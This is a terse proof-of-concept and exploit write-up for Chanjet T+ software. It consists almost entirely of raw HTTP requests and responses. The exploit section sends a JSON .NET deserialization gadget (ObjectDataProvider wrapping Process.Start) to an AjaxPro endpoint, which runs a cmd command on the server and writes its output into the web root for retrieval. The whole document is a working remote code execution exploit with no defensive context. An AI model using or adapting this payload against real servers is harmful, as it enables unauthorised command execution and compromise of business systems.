# poc
```
GET /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 10.13.2.221:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ukei2cl1qhd5w2m1o3u1jys4
Upgrade-Insecure-Requests: 1


```
- response
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/plain; charset=utf-8
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 17 Oct 2023 02:48:04 GMT
Connection: close
Content-Length: 238

{"value":new $T.DTO("Ufida.T.AA.DTO.WarehouseDTO, Ufida.T.AA.DTO, Version=17.0.0.0, Culture=neutral, PublicKeyToken=null",{"DtoClassName":"Ufida.T.AA.DTO.WarehouseDTO","AliName":"WarehouseDTO","Status":0,"ChangedProperty":[]}).UnTypify()}
```
# exp
```
POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 10.13.2.221:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ukei2cl1qhd5w2m1o3u1jys4
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 604

{
  "storeID":{
	"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
	"MethodName":"Start",
	"ObjectInstance":{
		"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
		"StartInfo": {
			"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
			"FileName":"cmd", "Arguments":"/c whoami /all > C:/Progra~2/Chanjet/TPlusStd/Website/2RUsL6jgx9sGX4GItBcVfxarBM.txt"
		}
	}
  }
}
```
- response
```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
Expires: -1
Server: Microsoft-IIS/8.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Tue, 17 Oct 2023 03:03:31 GMT
Connection: close
Content-Length: 115

{"error":{"Message":"actorId或archivesId不能为空，actorId:,archivesId:78","Type":"System.ArgumentException"}}
```
- command result
```
http://ip:port/tplus/2RUsL6jgx9sGX4GItBcVfxarBM.txt
```